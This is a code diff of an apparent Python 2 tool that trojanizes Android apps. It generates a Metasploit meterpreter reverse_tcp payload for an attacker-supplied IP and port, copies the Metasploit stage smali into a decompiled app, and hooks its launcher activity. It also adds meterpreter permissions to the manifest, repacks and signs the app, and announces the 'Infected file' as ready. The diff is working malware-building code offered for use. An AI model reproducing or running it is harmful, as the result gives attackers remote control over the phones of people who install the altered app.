@@ -6,11 +6,11 @@ import errno
 import os
 import shutil
 import time
-
 import xml.etree.ElementTree as ET
 
-from apkhandling import builder, manifest_analyzer
-from apkhandling import smali_converter
+from apkhandling import builder
+from manifestmanager import manifest_analyzer, manifest_manager
+from hookmanager import main_hook
 
 # tasks:
 # - write/include argument parser
@@ -46,6 +46,8 @@ def parseArgs():
     parser.add_argument("-out", "--output", action="store", dest="output_dir", default="")
     parser.add_argument("--meterpreter_ip", action="store", dest="meterpreter_ip", default="")
     parser.add_argument("--meterpreter_port", action="store", dest="meterpreter_port", default="")
+    parser.add_argument("--broadcast_hook", action="store_true", dest="broadcast_hook", default=False)
+    parser.add_argument("--noclean", action="store_false", dest="clean", default=True)
     args_parsed = parser.parse_args(sys.argv[1:])
 
     # convert to dictonary
@@ -59,6 +61,19 @@ def parseArgs():
         args['meterpreter_arguments'] = "-p android/meterpreter/reverse_tcp LHOST=" + str(args['meterpreter_ip']) + \
                                         " LPORT=" + str(args['meterpreter_port']) + " -o payload.apk"
 
+def mkdir_p(path):
+    """
+        make directories and accepts that a directory may be already there.
+        Legacy function for Python < 3.5
+        :param path: - to be created
+    """
+    try:
+        os.makedirs(path)
+    except OSError as exc:  # Python >2.5
+        if exc.errno == errno.EEXIST and os.path.isdir(path):
+            pass
+        else:
+            raise
 
 # checks if a given program is installed on the computer
 # Returns True or False
@@ -127,6 +142,8 @@ def check_requirements():
         print "Please specify the path to the original apk with the -o parameter"
         sys.exit(1)
 
+
+
 def main():
     global args
 
@@ -159,6 +176,14 @@ def main():
     builder.decompileApk("payload.apk")
     #_____________________________________________________________________________________________#
     # TODO Moritz: Structure this section; Include other hooks
+    # Steps:
+    # 1. find launcher activity
+    # 2. copy smali files from payload to original
+    # 3. place hook in launcher activity with smali_converter.generate_hooked_smali(smali_file)
+    # 4. fix the manifest
+    # 5. Inject broadcast receiver as smali file
+    # 6. fix the manifest: add permissions; add receiver
+
     # read the manifest to xml model
     print "Reading android manifest"
 
@@ -170,8 +195,13 @@ def main():
     print smali_file
     time.sleep(10)
 
+    # TODO make path dynamic
     print "[*] Copying payload files..\n"
-    hookedsmali = smali_converter.generate_hooked_smali(smali_file)
+    mkdir_p('original/_decompiled/smali/com/metasploit/stage')
+    os.system('cp payload/_decompiled/smali/com/metasploit/stage/*.smali '
+              'original/_decompiled/smali/com/metasploit/stage/')
+
+    hookedsmali = main_hook.generate_hooked_smali(smali_file)
     print "[*] Loading ", smali_file, " and injecting payload..\n"
 
     with open(smali_file, "w") as f:
@@ -181,25 +211,25 @@ def main():
     print "[*] Poisoning the manifest with meterpreter permissions..\n"
     payload_manifest = "payload/_decompiled/AndroidManifest.xml"
     original_manifest = "original/_decompiled/AndroidManifest.xml"
-    manifest_analyzer.fix_manifest(payload_manifest, original_manifest, original_manifest)
+    manifest_manager.fix_manifest(payload_manifest, original_manifest, original_manifest)
 
-    print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"
+    print "[*] Rebuilding"
 
     builder.repackApk("original/_decompiled/")
-    print "[*] Signing #{injected_apk} ..\n"
+    print "[*] Signing"
 
     #_____________________________________________________________________________________________#
     run_jarsigner(
         "-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg "
         "MD5withRSA " + injected_apk + " androiddebugkey")
+    if args['clean']:
+        # clean up
+        print "[*] Clean up intermediate states\n"
+        shutil.rmtree('original/')
+        shutil.rmtree('payload/')
+        os.remove("original.apk")
+        os.remove("payload.apk")
 
-    # clean up
-    print "[*] Clean up intermediate state ..\n"
-    #shutil.rmtree('original/')
-    ##shutil.rmtree('payload/')
-
-    #os.remove("original.apk")
-    #os.remove("payload.apk")
     print "[+] Infected file " + injected_apk + " ready.\n"
 
      
